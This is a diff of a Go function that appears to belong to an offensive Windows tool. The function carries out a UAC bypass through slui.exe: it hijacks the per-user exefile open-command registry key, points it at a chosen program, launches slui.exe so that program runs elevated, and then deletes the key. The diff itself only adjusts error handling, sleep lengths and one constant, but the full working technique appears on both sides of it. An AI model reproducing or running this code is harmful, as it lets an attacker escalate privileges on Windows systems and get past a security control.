@@ -23,7 +23,7 @@ func HWND_W32_Method_Slui(path string) error {
 		},
 
 		Location: fmt.Sprintf("%s\\_slui.gUAC", os.Getenv("APPDATA")),
-		_K_Slui:  0x6,
+		_K_Slui:  0x8,
 	}
 
 	if len(c.Type)&len(c.Method) == 0 {
@@ -37,7 +37,7 @@ func HWND_W32_Method_Slui(path string) error {
 	var currentDir string
 	currentDir, err = filepath.Abs(path)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	_, _, err = registry.CreateKey(
@@ -45,7 +45,7 @@ func HWND_W32_Method_Slui(path string) error {
 		registry.SET_VALUE|registry.ALL_ACCESS)
 
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	wkey32, err = registry.OpenKey(
@@ -53,42 +53,44 @@ func HWND_W32_Method_Slui(path string) error {
 		registry.QUERY_VALUE|registry.SET_VALUE,
 	)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Setting DEFAULT key value for the ABSOLUTE program path
 	// +0x23df ...
 
 	if err := wkey32.SetStringValue("", currentDir); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Setting "DelegateExecure" key value to None
 	// +0x25df ...d
 
 	if err := wkey32.SetStringValue("DelegateExecute", ""); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Absolute key function closing
 	// +0x54ef ...
 
 	if err := wkey32.Close(); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
-	// Sleep for 4 seconds ...
-	time.Sleep(1 * 1 * time.Second)
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
 
 	// Execute cmd-like command "start slui.exe" ...
 	var cmd = exec.Command("slui.exe")
 	err = cmd.Run()
 
-	time.Sleep(1 * 1 * time.Second)
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
+
 	// Absolutly delete registry key "Software\Classes\exefile\shell\open\command" ...
 	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	return err
